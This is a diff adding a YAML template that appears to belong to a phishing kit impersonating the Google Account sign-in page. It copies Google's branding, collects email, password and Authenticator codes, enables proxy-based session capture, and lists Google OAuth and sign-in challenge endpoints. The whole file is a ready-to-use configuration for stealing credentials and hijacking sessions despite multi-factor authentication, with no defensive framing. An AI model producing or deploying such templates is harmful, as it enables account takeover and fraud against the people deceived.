@@ -1,0 +1,38 @@
+name: "Gmail / Google Account Login"
+author: "Sheikh-CoedexTech"
+version: "1.0"
+
+page_title: "Sign in - Google Accounts"
+company_name: "Google"
+logo_url: "https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
+favicon_url: "https://www.google.com/favicon.ico"
+redirect_after: "https://mail.google.com/mail/u/0/#inbox"
+
+fields:
+  - id: email
+    name: email
+    label: Email or phone
+    type: email
+    placeholder: "Enter your email"
+    required: true
+  - id: password
+    name: password
+    label: Password
+    type: password
+    placeholder: "Enter your password"
+    required: true
+  - id: mfa_code
+    name: TotpPin
+    label: Google Authenticator code
+    type: text
+    placeholder: "Enter the code from Google Authenticator"
+    required: false
+
+session_capture: true
+session_capture_method: proxy
+
+oauth_endpoints:
+  - "/o/oauth2/auth"
+  - "/o/oauth2/token"
+  - "/signin/oauth"
+  - "/_/signin/sl/challenge"
